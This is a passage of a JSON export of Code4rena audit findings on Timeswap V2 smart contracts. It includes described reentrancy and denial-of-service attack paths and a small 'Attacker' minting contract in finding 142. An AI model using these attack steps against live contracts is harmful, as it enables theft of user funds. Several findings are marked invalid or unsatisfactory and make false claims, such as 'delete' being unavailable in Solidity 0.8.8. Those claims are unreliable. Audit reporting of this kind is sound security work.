+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L359\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L293\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-library/src/Error.sol#L152\n\n\n# Vulnerability details\n\n## Impact\n\nProtocol currently uses 2 levels of callbacks for minting:\n\n**Inner Level callback**: `timeswapV2PoolMintChoiceCallback` function in [Line 349 of Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L349) that allows users to choose `Long0` and `Long1` amounts such that `long0 + long1(converted based on strike) <= long`. This is enforced by `checkEnough` function in Line359. Purpose of this callback is to allow users a freedom to choose composition of long0 & long 1 amount (since AMM only cares about the sum & not individual amounts)\n\n**Outer level callback**: `timeswapV2PoolMintCallback` function in [Line 277 of TimeswapV2Pool.sol](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L277) expects user to send to the pool respective amounts of long0, long1 (determined by previous callback) and short tokens corresponding to the liquidity position minted. Purpose of this callback is to ensure user sends right amount of long0/long1/short tokens. `checkEnough` calls in Line 293/295 and 297 ensure this.\n\nProblem with this 2 level callback design is that users can choose `long0` and `long1` tokens such that `long0 + long1 > long` in first callback. In such as case, pool forces users to send this higher amount of `long0 + long1` tokens in the second callback and yet mints LP tokens only corresponding to the lower amount (original `long` amount).\n\nExcess t"
+    },
+    {
+      "number": 153,
+      "title": "`TimeswapV2LiquidityToken`: `collect()` will always revert because it uses the wrong parameters when calling `ITimeswapV2Pool.transferFees()`",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "satisfactory",
+        "upgraded by judge",
+        "duplicate-121"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L193\n\n\n# Vulnerability details\n\n## Proof of Concept\n`collect()` uses the wrong paramenters when calling `ITimeswapV2Pool.transferFees()`. It uses `long0Fees`, `long1Fees`, and `shortFees` instead of `param.long0FeesDesired`, `param.long1FeesDesired`, and `param.shortFeesDesired`. The former 3 are defined in the function's returns paramenters and aren't mutated before calling `ITimeswapV2Pool.transferFees()`. They all default to zero which would trigger a revert since `TimeswapV2Pool.transferFees()` reverts when `0` fees are being transferred on [line 167](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L167)\n\nCode snippet where the parameters default to 0\n![](https://i.imgur.com/8Irwx8f.png)\n\nCode snippet where `transferFees()` revert\n![](https://i.imgur.com/fcmwUGK.png)\n\n## Impact\n\nThis means users who mints liquidity tokens will be forfeiting their fees since `collect()` will always be calling `ITimeswapV2Pool.transferFees()` with `0`s as inputs. So I think a medium risk is warranted since users are losing funds.\n\n### Recommendation\n\nSwitch to `param.long0FeesDesired`, `param.long1FeesDesired`, and `param.shortFeesDesired` and check that the `msg.sender` has enough fees to be transferred.\n\nOR\n\nPlace line 193 after line 199, which does the check and mutates `(long0Fees, long1Fees, shortFees)` for you\n"
+    },
+    {
+      "number": 150,
+      "title": "[M] `TimeswapV2LiquidityToken.sol#collect()`  Incorrect implementation causing collect always fail",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "satisfactory",
+        "upgraded by judge",
+        "duplicate-121"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L181-L222\n\n\n# Vulnerability details\n\n## Impact\n\nThe function `collect()` in the provided code is supposed to transfer transaction fees from a liquidity token position to a recipient address. \n\nHowever, the function currently has an issue where the `long0Fees`, `long1Fees`, and `shortFees` variables are not initialized before being passed to the `ITimeswapV2Pool.transferFees()` function. and the `ITimeswapV2Pool.transferFees()` do not accept that.\n\nAs a result, the transaction will always fail.\n\n## Proof of Concept\n\nThe issue can be observed in the following line of code:\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L181-L222\n\n```solidity=181\n/// @inheritdoc ITimeswapV2LiquidityToken\n    function collect(TimeswapV2LiquidityTokenCollectParam calldata param) external returns (uint256 long0Fees, uint256 long1Fees, uint256 shortFees, bytes memory data) {\n        ParamLibrary.check(param);\n\n        bytes32 key = TimeswapV2LiquidityTokenPosition({token0: param.token0, token1: param.token1, strike: param.strike, maturity: param.maturity}).toKey();\n\n        // start the reentrancy guard\n        raiseGuard(key);\n\n        (, address poolPair) = PoolFactoryLibrary.getWithCheck(optionFactory, poolFactory, param.token0, param.token1);\n\n        // transfer the fees amount to the recipient\n        ITimeswapV2Pool(poolPair).transferFees(param.strike, param.maturity, param.to, long0Fees, long1Fees, shortFees);\n\n        uint256 id = _timeswapV2LiquidityTokenPositionIds[key];\n\n        _updateFeesPositions(msg.sender, address(0), id);\n\n        (long0Fees, long1Fees, shortFees) = _feesPositions[id][msg.sender].getFees(param.long0FeesDesired, param.long1FeesDesired, param.shortFeesDesired);\n\n        if (param.data.length != 0)\n     "
+    },
+    {
+      "number": 146,
+      "title": "The `transferFeesFrom` function does not check if the \"from\" address is the actual owner of the position before transferring the fees.",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L75-L96\n\n\n# Vulnerability details\n\n## Impact\nThe code Doesn't check if the `from` address is the owner of the position before transferring the fees. If the `from` address is not the owner of the position, an attacker could potentially transfer fees from another user's position without their permission. This is an Access control vulnerability because it allows an attacker to steal fees from another user's position without their authorization.\n\n## Proof of Concept\n[TimeswapV2LiquidityToken.sol#L75-L96](https://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L75-L96)\n\n```\nfunction transferFeesFrom(address from, address to, TimeswapV2LiquidityTokenPosition calldata position, uint256 long0Fees, uint256 long1Fees, uint256 shortFees) external override {\n        if (from == address(0)) Error.zeroAddress();\n        if (to == address(0)) Error.zeroAddress();\n\n        if (!isApprovedForAll(from, msg.sender)) revert NotApprovedToTransferFees();\n\n        uint256 id = _timeswapV2LiquidityTokenPositionIds[position.toKey()];\n\n        if (long0Fees != 0 || long1Fees != 0 || shortFees != 0) _addTokenEnumeration(from, to, id, 0);\n\n        // add/mint the fees for the new user\n        _feesPositions[id][to].mint(long0Fees, long1Fees, shortFees);\n\n        _updateFeesPositions(from, to, id);\n\n        // remove/burn the fees\n        _feesPositions[id][from].burn(long0Fees, long1Fees, shortFees);\n\n        if (long0Fees != 0 || long1Fees != 0 || shortFees != 0) _removeTokenEnumeration(from, to, id, 0);\n\n        emit TransferFees(from, to, position, long0Fees, long1Fees, shortFees);\n    }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nby storing the owner of each position in a mapping or an array and then checking that the from "
+    },
+    {
+      "number": 142,
+      "title": "Unchecked Token Minting: A Critical Vulnerability in Timeswap V2 Token Contract",
+      "labels": [
+        "invalid",
+        "3 (High Risk)",
+        "withdrawn by warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L76\n\n\n# Vulnerability details\n\n## Impact\n\nIt allows an attacker to mint new tokens without proper checks and validations, which can result in an inflation of the total supply of tokens and a loss of funds for the contract's owner or users. The contract's \"mint\" function allows the attacker to mint new tokens without any restrictions\n\n## Proof of Concept\n\n#### code \n\n```\ncontract Attacker {\n    address payable timeswapV2Token;\n    address payable attackerAddress;\n\n    constructor(address _timeswapV2Token) {\n        timeswapV2Token = _timeswapV2Token;\n        attackerAddress = msg.sender;\n    }\n\n    function mint(uint256 _long0Amount, uint256 _long1Amount, uint256 _shortAmount) public {\n        TimeswapV2TokenMintParam memory param = TimeswapV2TokenMintParam({\n            token0: address(0xxx),\n            token1: address(0xxx),\n            strike: 0,\n            maturity: 0,\n            long0To: attackerAddress,\n            long1To: attackerAddress,\n            shortTo: attackerAddress,\n            long0Amount: _long0Amount,\n            long1Amount: _long1Amount,\n            shortAmount: _shortAmount,\n            data: \"\"\n        });\n        ITimeswapV2Token(timeswapV2Token).mint(param);\n    }\n}\n```\n\n#### Explanation\n\nIn this example, the \"Attacker\" contract has a \"mint\" function that takes in the amount of tokens to mint for each position (long0, long1, short) as arguments. The function then creates a new \"TimeswapV2TokenMintParam\" struct, with the recipient addresses set to the address of the attacker, and the amounts of tokens to mint for each position passed as arguments. The function then calls the \"mint\" function of the Timeswap V2 Token contract, passing in the maliciously crafted \"TimeswapV2TokenMintParam\" struct. This allows the attacker to mint new tokens without any restrictions, effectively stealing the funds.\n\n## Recommended Mitigation Step"
+    },
+    {
+      "number": 140,
+      "title": "Reentrancy attack to swap()",
+      "labels": [
+        "invalid",
+        "3 (High Risk)",
+        "withdrawn by warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L223-L232\n\n\n# Vulnerability details\n\n## Impact\nDetailed description of the impact of this finding.\nA malicious contract can initiate a reentrancy attack to the ``swap()`` function:  it can swap ``token0`` for ``token1``, receiving ``token0`` but without effectively providing the due ``token1`` amount (used to mint instead). \n\n## Proof of Concept\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.\nA malicious contract can initiate a reentrancy attack to the ``swap()`` function such that he/she can swap ``token0`` for ``token1``, receiving ``token0`` but without providing the due ``token1`` amount. Suppose a malicious contract C does the following: \n\n1) call  ``swap()`` to swap 2 WETH for 4000 USDC. First contract C (the caller) will receive 2 WETH via the following line to the designated address ``param.tokenTo``:\n\n```\n// transfer token to recipient.\n        IERC20(param.isLong0ToLong1 ? token0 : token1).safeTransfer(param.tokenTo, param.isLong0ToLong1 ? token0AndLong0Amount : token1AndLong1Amount);\n```\n\n2) Then the following line calls contract C back to expect C to send the 4000 USDC:\n```\ndata = ITimeswapV2OptionSwapCallback(msg.sender).timeswapV2OptionSwapCallback(\n            TimeswapV2OptionSwapCallbackParam({\n                strike: param.strike,\n                maturity: param.maturity,\n                isLong0ToLong1: param.isLong0ToLong1,\n                token0AndLong0Amount: token0AndLong0Amount,\n                token1AndLong1Amount: token1AndLong1Amount,\n                data: param.data\n            })\n        );\n```\n\n3) The malicious implementation of ``timeswapV2OptionSwapCallback()`` actually calls ``mint()`` in ``TimeswapV2Option`` to mint 4000 USDC long tokens successfully;\n\n4) When the control is back to ``swap()``, wh"
+    },
+    {
+      "number": 139,
+      "title": "Pool.sol: The collectProtocolFees() function can be called by anyone",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/structs/Pool.sol#L210-L249\n\n\n# Vulnerability details\n\n## Impact\nAs specified in the documentation, the collectProtocolFees() should be called only by the protocol owner.\nHowever, as this is an external function, an attacker is able to call it and to perform the actions inside the function.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/structs/Pool.sol#L210-L249\nThe collectProtocolFees() function is external and does not verify that the msg.sender is allowed to call this function.\n\n\n## Recommended Mitigation Steps\nVerify if the msg.sender is the protocol owner at the start of the function."
+    },
+    {
+      "number": 136,
+      "title": "Unsecured usage of msg.sender in smart contract functions TimeswapV2Pool.sol.",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L453-L455\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L261\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2Pool.sol#L475\n\n\n# Vulnerability details\n\n## Impact\n\nThe bug is related to the use of the `msg.sender` in the smart contract functions. The `msg.sender` is a built-in variable in the Solidity programming language, which represents the address of the account that called the function, the `msg.sender` is used to determine the account that is calling the functions `mint()`, `leverage()` and `rebalance()`.\n\nLine of code where this vulnerability occurs is in the `leverage()` function.\n\n```solidity\ndata = ITimeswapV2PoolLeverageCallback(msg.sender).timeswapV2PoolLeverageCallback(\n            TimeswapV2PoolLeverageCallbackParam({strike: param.strike, maturity: param.maturity, long0Amount: long0Amount, long1Amount: long1Amount, shortAmount: shortAmount, data: data})\n        );\n```\n\nand in the `mint()` function.\n\n```solidity\n(liquidityAmount, long0Amount, long1Amount, shortAmount, data) = pools[param.strike][param.maturity].mint(param, blockTimestamp(durationForward));\n```\n\nand in the `rebalance()` function.\n\n```solidity\n(long0Amount, long1Amount) = pools[param.strike][param.maturity].rebalance(param, transactionFee, protocolFee);\n```\n\nThe problem with using `msg.sender` is that it can be easily `spoofed` by \"malicious actors\". An attacker can use a malicious contract to call the functions on behalf of another account, allowing them to perform actions as if they were another user. This can have serious consequences, as an attacker could potentially steal assets or disrupt the normal operation of the smart contract.\n\n## Proof of Concept\n\n1. First, deploy the vuln"
+    },
+    {
+      "number": 127,
+      "title": "Missing Access Controls in Liquidity Position Library",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/LiquidityPosition.sol#L33-L38\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/LiquidityPosition.sol#L51\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/LiquidityPosition.sol#L65\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/LiquidityPosition.sol#L69\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/LiquidityPosition.sol#L75\n\n\n# Vulnerability details\n\n## Impact\n\n```solidity\nfunction feesEarnedOf(\n    LiquidityPosition memory liquidityPosition,\n    uint256 long0FeeGrowth,\n    uint256 long1FeeGrowth,\n    uint256 shortFeeGrowth\n) internal pure returns (uint256 long0Fee, uint256 long1Fee, uint256 shortFee) {\n    ...\n}\n\nfunction update(LiquidityPosition storage liquidityPosition, uint256 long0FeeGrowth, uint256 long1FeeGrowth, uint256 shortFeeGrowth) internal {\n    ...\n}\n\nfunction mint(LiquidityPosition storage liquidityPosition, uint160 liquidityAmount) internal {\n    ...\n}\n\nfunction mintFees(LiquidityPosition storage liquidityPosition, uint256 long0Fees, uint256 long1Fees, uint256 shortFees) internal {\n    ...\n}\n\nfunction burn(LiquidityPosition storage liquidityPosition, uint160 liquidityAmount) internal {\n    ...\n}\n```\n\nThese functions do not include any access controls, meaning that anyone would be able to call them and potentially manipulate the liquidity positions and fees. This can allow malicious actors to perform unauthorized actions such as increasing their own liquidity `positions or fees` or decreasing others.\n\nMalicious actors may be able to exploit this vulnerability to gain an unfair advantage over other users, potentially leading"
+    },
+    {
+      "number": 123,
+      "title": "Unauthorized Access to Transaction Fees in the \"collectTransactionFees\" Function",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L281\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/structs/Pool.sol#L262-L282\n\n\n# Vulnerability details\n\n## Impact\n\n```solidity\n(long0Amount, long1Amount, shortAmount) = liquidityPosition.collectTransactionFees(long0Requested, long1Requested, shortRequested);\n```\nIt doesn't check whether the `msg.sender` is a liquidity provider before allowing them to collect transaction fees, which means any user can call this function and collect transaction fees.\n\n```solidity\nfunction collectTransactionFees(\n        Pool storage pool,\n        uint256 maturity,\n        uint256 long0Requested,\n        uint256 long1Requested,\n        uint256 shortRequested,\n        uint96 blockTimestamp\n    ) external returns (uint256 long0Amount, uint256 long1Amount, uint256 shortAmount) {\n        // Update the state of the pool first for the short fee growth.\n        if (pool.liquidity != 0) {\n            if (maturity > blockTimestamp) updateDurationWeightBeforeMaturity(pool, blockTimestamp);\n            else if (pool.lastTimestamp < maturity) updateDurationWeightAfterMaturity(pool, maturity, blockTimestamp);\n        }\n        // Update the fee growth and fees of caller.\n        LiquidityPosition storage liquidityPosition = pool.liquidityPositions[msg.sender];\n\n        if (pool.liquidity != 0) liquidityPosition.update(pool.long0FeeGrowth, pool.long1FeeGrowth, pool.shortFeeGrowth);\n\n        (long0Amount, long1Amount, shortAmount) = liquidityPosition.collectTransactionFees(long0Requested, long1Requested, shortRequested);\n    }\n```\n\nIf any user can call this function, regardless of whether or not they have a `liquidity` position in the pool, they can collect transaction fees. This can lead to `unauthorized access` to transaction fees, which can cause significant financial harm to other us"
+    },
+    {
+      "number": 122,
+      "title": "Unchecked token decimals",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L205\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/structs/Option.sol#L164-L169\n\n\n# Vulnerability details\n\n## Impact\ncoins can have differeant decimal points.For example, btc has 8,USDC has 6,eth has 18 etc.When try to swap this will lead some unexpected behaviour.\n\n## Proof of Concept\nLets think in eth-btc option pair,btc token 0 and eth token1. If we determined strike price 10 (currently 1 btc 14.6 eth) and want to swap 20 eth from btc in TimeSwapV2Option contract's swap function's  var token0long0amount will be 2*(10**18)/(10**8) and try to withdraw this amount btc with swapcallback because eth has 18 decimals when btc has 8.At the end strike price actually behave like (strikePrice)*(10**(token1.decimal-token0.decimal).Due to there can be any token pair can be creted and in the token ecosystem there are  too many variant of decimal number.Not checking of tokens decimal can be lead too many unexpected behaviour from contract to user. \n## Tools Used\n\n## Recommended Mitigation Steps\nWhen created option pair ,strike_price can be changed with (strikePrice)*(10**(token1.decimal-token0.decimal). "
+    },
+    {
+      "number": 121,
+      "title": "The collect() function will always TRANSFER ZERO fees, losing _feesPositions without receiving fees!",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "primary issue",
+        "satisfactory",
+        "selected for report",
+        "sponsor confirmed",
+        "edited-by-warden",
+        "H-03"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L193\n\n\n# Vulnerability details\n\n## Impact\nDetailed description of the impact of this finding.\nThe ``collect()`` function will always transfer ZERO fees. At the same time, non-zero ``_fessPosition`` will be burned. \n```\n_feesPositions[id][msg.sender].burn(long0Fees, long1Fees, shortFees);\n```\nAs a result, the contracts will be left in an inconsistent state. The user will burn ``_feesPositions`` without receiving the the  fees!\n\n## Proof of Concept\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.\nThe ``collect()`` function will always transfer ZERO fees   in the following line:\n\n```\n // transfer the fees amount to the recipient\n        ITimeswapV2Pool(poolPair).transferFees(param.strike, param.maturity, param.to, long0Fees, long1Fees, shortFees);\n\n```\nThis is because, at this moment, the values of  ``long0Fees``, ``long1Fees``, ``shortFees`` have not been calculated yet, actually, they will be equal to zero. Therefore, no fees will be transferred. The values of  ``long0Fees``, ``long1Fees``, ``shortFees`` are calculated afterwards by the following line:\n```\n(long0Fees, long1Fees, shortFees) = _feesPositions[id][msg.sender].getFees(param.long0FeesDesired, param.long1FeesDesired, param.shortFeesDesired);\n\n```\nTherefore, ``ITimeswapV2Pool(poolPair).transferFees`` must be called after this line to be correct. \n\n## Tools Used\nRemix\n\n## Recommended Mitigation Steps\nWe moved the line  ``ITimeswapV2Pool(poolPair).transferFees`` after ``long0Fees``, ``long1Fees``, ``shortFees`` have been calculated first. \n\n```\nfunction collect(TimeswapV2LiquidityTokenCollectParam calldata param) external returns (uint256 long0Fees, uint256 long1Fees, uint256 shortFees, bytes memory data) {\n        ParamLibrary.check(param);\n\n        bytes32 key = Ti"
+    },
+    {
+      "number": 114,
+      "title": "There are two bugs in the implementation of _removeTokenFromOwnerEnumeration()",
+      "labels": [
+        "invalid",
+        "3 (High Risk)",
+        "withdrawn by warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-token/src/base/ERC1155Enumerable.sol#L136-L149\n\n\n# Vulnerability details\n\n## Impact\nDetailed description of the impact of this finding.\nThere are two bugs in the implementation of ``_removeTokenFromOwnerEnumeration()``\n\n## Proof of Concept\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.\nThere are two bugs in the implementation of ``_removeTokenFromOwnerEnumeration()``:\n1) ``lastTokenIndex`` should be ``_currentIndex[from]``, see the implementation of ``_addTokenToOwnerEnumeration()``, the last index used is actually ``_currentIndex[from]``, not ``_currentIndex[from]-1``;\n2) ``_currentIndex[from]`` should be decremented by one. \n \n\n## Tools Used\nRemix\n\n## Recommended Mitigation Steps\nThe fix is as follows:\n```\nfunction _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private {\n        uint256 lastTokenIndex = _currentIndex[from];   // @audit: fix here\n        uint256 tokenIndex = _ownedTokensIndex[tokenId];\n\n        if (tokenIndex != lastTokenIndex) {\n            uint256 lastTokenId = _ownedTokens[from][lastTokenIndex];\n\n            _ownedTokens[from][tokenIndex] = lastTokenId;\n            _ownedTokensIndex[lastTokenId] = tokenIndex;\n        }\n\n        delete _ownedTokensIndex[tokenId];\n        delete _ownedTokens[from][lastTokenIndex];\n        _currentIndex[from] -= 1;            // @audit: fix here\n    }\n```"
+    },
+    {
+      "number": 94,
+      "title": "DOS attack to updateProcess()",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "sponsor acknowledged",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/structs/Process.sol#L33-L45\n\n\n# Vulnerability details\n\n## Impact\nDetailed description of the impact of this finding.\nThe ``updateProcess()`` iterates though each element in ``Process[]`` array, therefore, it is subject to a DOS attack \nwhen a malicious user can increase the length of ``Process[]`` such that ``updateProcess()``  runs out of gas.\n\n## Proof of Concept\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates \nthe concept.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/TimeswapV2Option.sol#L121\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-option/src/structs/Process.sol#L33-L45\n\nThis is how a DOS attack can occur:\n\n1) A malicious user can call ``mint()`` of a particular  ``TimeswapV2Option`` contract (corresponds to a particular optionPair) repeatedly with minimal amounts for ``token0Amount`` and ``token1Amount``. \n\nFor example, when the malicious contract calls ``mint()``, the callback function ``ITimeswapV2OptionMintCallback(msg.sender).timeswapV2OptionMintCallback()`` can call ``mint()`` recursively each time it gets called (one can also control the depth of the recursion) to effectively increasing the length of ``Process[]`` without popping.  As a result, the length of ``Process[]`` will keep increasing since the function will call ``Processing.push()`` as follows:\n```\nProcess storage currentProcess = (processing.push() = Process(\n            param.strike,\n            param.maturity,\n            IERC20(token0).balanceOf(address(this)) + token0AndLong0Amount,\n            IERC20(token1).balanceOf(address(this)) + token1AndLong1Amount\n        ));\n```\n\n\n2) At some point, when the ``Processing.length`` is large enough, future calls "
+    },
+    {
+      "number": 90,
+      "title": "Important changes to state are made after external calls in collect()",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L258-L275\n\n\n# Vulnerability details\n\n## Impact\nIn TimeswapV2Option.sol, the collect() function has external calls and callbacks in the middle of the function before important changes to state variables take place (update to option balances). \n\nIf a reentrancy occurs by triggering the timeswapV2OptionCollectCallback() callback, it will reach a state where TimeswapV2Option.totalPosition() is updated but TimeswapV2Option.positionOf() remains unchanged. This is because option.totalLong0 and optionTotalLong1 are updated in option.collect() in L253 before the callback. However, option.long0[msg.sender], option.long1[msg.sender] and option.short[msg.sender] are updated after the callback.\n\nThis violates Checks-Effects-Interactions pattern and it can be risky for composability with other protocols and ERC20 tokens.\n\n## Recommended Mitigation Steps\nThe safeTransfer() calls and callback function should be placed at the end of the function after all state updates have taken place."
+    },
+    {
+      "number": 89,
+      "title": "Important changes to state are made after external calls in swap()",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L219-L232\n\n\n# Vulnerability details\n\n## Impact\nIn TimeswapV2Option.sol, the swap() function has external calls and callbacks in the middle of the function before important changes to state variables take place (update to option balances). \n\nIf a reentrancy occurs by triggering the timeswapV2OptionSwapCallback() callback, it will reach a state where TimeswapV2Option.totalPosition() is updated but TimeswapV2Option.positionOf() remains unchanged. This is because option.totalLong0 and optionTotalLong1 are updated in option.swap() in L205 before the callback. However, option.long0[msg.sender], option.long1[msg.sender] and option.short[msg.sender] are updated after the callback.\n\nThis violates Checks-Effects-Interactions pattern and it can be risky for composability with other protocols and ERC20 tokens.\n\n\n## Recommended Mitigation Steps\nThe safeTransfer() calls and callback function should be placed at the end of the function after all state updates have taken place."
+    },
+    {
+      "number": 88,
+      "title": "Important changes to state are made after external calls in burn()",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory",
+        "edited-by-warden"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L171-L188\n\n\n# Vulnerability details\n\n## Impact\nIn TimeswapV2Option.sol, the burn() function has external calls and a callback in the middle of the function before important changes to state variables take place (update to option balances). \n\nIf a reentrancy occurs by triggering the timeswapV2OptionBurnCallback() callback or ERC20 safeTransfer(), it will reach a state where TimeswapV2Option.totalPosition() is updated but TimeswapV2Option.positionOf() remains unchanged. This is because option.totalLong0 and optionTotalLong1 are updated in option.burn() in L166 before the callback. However, option.long0[msg.sender], option.long1[msg.sender] and option.short[msg.sender] are updated after the callback.\n\nThis violates Checks-Effects-Interactions pattern and it can be risky for composability with other protocols and ERC20 tokens.\n\n## Recommended Mitigation Steps\nThe safeTransfer() calls and callback function should be placed at the end of the function after all state updates have taken place."
+    },
+    {
+      "number": 83,
+      "title": " Incompatible 'delete' keyword usage in Solidity 0.8.8 causing compilation error.",
+      "labels": [
+        "bug",
+        "3 (High Risk)",
+        "unsatisfactory"
+      ],
+      "body": "# Lines of code\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/ef4c84fb8535aad8abd6b67cc45d994337ec4514/packages/v2-pool/src/TimeswapV2PoolDeployer.sol#L30\n\n\n# Vulnerability details\n\n## Impact\n\n```solidity\ndelete parameter;\n```\nThis line tries to zero out the storage variable \"parameter\", but the \"delete\" keyword is not available in solidity version 0.8.8. This will cause a compilation error and prevent the contract from being deployed. This can cause a loss of functionality and potential financial losses for users who are relying on the contract.\n\n\n## Proof of Concept\n\n Proof of concept for this vulnerability would involve attempting to deploy the contract on a blockchain network using Solidity version 0.8.8. The deployment process would result in a compilation error due to the use of the \"delete\" keyword, which is not available in this version of Solidity.\n\nTo demonstrate this:\n\n1. I Opened a solidity compiler,  \"Remix IDE\" to be precise, and copy the code of the smart contract.\n\n2. In the compiler settings, i set the compiler version to 0.8.8\n\n3. Tried to deploy the contract, the deployment but it failed with a compilation error indicating that the \"delete\" keyword is not available in solidity version 0.8.8\n\nThis proof of concept demonstrates that the contract cannot be deployed on a blockchain network using Solidity version 0.8.8 due to the use of the \"delete\" keyword, which is not available in this version of 